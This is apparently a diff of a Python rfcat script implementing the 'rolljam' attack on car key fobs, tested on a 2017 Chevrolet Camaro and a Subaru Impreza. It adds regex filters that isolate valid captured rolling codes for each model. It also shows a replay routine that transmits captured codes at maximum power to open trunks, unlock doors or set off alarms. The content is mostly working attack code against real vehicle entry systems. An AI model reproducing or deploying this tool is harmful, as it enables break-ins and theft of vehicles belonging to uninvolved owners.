@@ -1,7 +1,6 @@
-#figure out bandwidth settings for rolljam
-#write readme.md with documentation, jamming info
-#make function for rfcat setup?
-#comment code properly
+#TODO write readme.md with documentation, jamming info
+#TODO fix issues with using rfcat repeatedly. make function for rfcat setup?
+#TODO comment code properly
 
 import argparse
 import os
@@ -265,7 +264,7 @@ def roll_transmit(frequency, baudrate, modulation, code):
     d.setMaxPower()
     d.lowball()
     #formatting
-    binary = bin(int(code,16))[2:]
+    binary = bin(int(code, 16))[2:]
     raw_code = bitstring.BitArray(bin=(binary)).tobytes()
     #transmitting
     print("[+] Sending code "+str(code))
@@ -286,6 +285,7 @@ camaro - tested on 2017 Chevrolet Camaro (filter codes)
 def rolljam_car(car, code):
     c = raw_input("Would you like to: open (t)runk, (p)anic alarm, (l)ock, (u)nlock: ")
     if car=="subaru":
+        #lock and unlock needs tested (no longer have access to impreza), trunk and panic alarm need to be added
         if c=="l":
             prefix="lock"
             #TODO code=code.parse_out_prefix
@@ -318,14 +318,22 @@ def filter(car, codes):
     if car=="subaru":
         print("Filtering codes for "+car)
         for c in codes:
-            #TODO if passes regex:  prob convert to bin first, then compare, then hex
-                filtered_codes.append(c)
+            binarycode=bin(int(c, 16))
+            #checks if subaru code is formatted correctly
+            rc = re.search('1010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101101010011010100110101010100110101010010101011010100101101001100[0-1]{8}1010101010101010110011001101[0-1]{17,20}', binarycode)
+            if rc is not None:
+                #ensures code isn't messed up by how it's spaced with 9 null bytes (yard stick may detect noise during that time)
+                uc = re.search('10101010101010101101010011010100110101010100110101010010101011010100101101001100[0-1]{8}1010101010101010110011001101[0-1]{17,20}', rc.group(0))
+                if uc is not None:
+                    clean_code = (('1010'*41)+uc.group(0)+('0'*9)+uc.group(0))
+                    filtered_codes.append(hex(int(clean_code, 2)))
 
     elif car=="camaro":
         print("Filtering codes for "+car)
         for c in codes:
-            #TODO if check for prefix with regex. prob convert to bin compare, then hex
-                filtered_codes.append(c)
+            rc = re.search('100110011001100110011001100110011001100110011001100110011001100110011001100110011001100101011001010101100101100101010101100110100101011010010110[0-1]{139,146}', bin(c))
+            if rc is not None:
+                filtered_codes.append(hex(int(rc.group(0), 2)))
 
     else:
         print("[-] Car not supported")
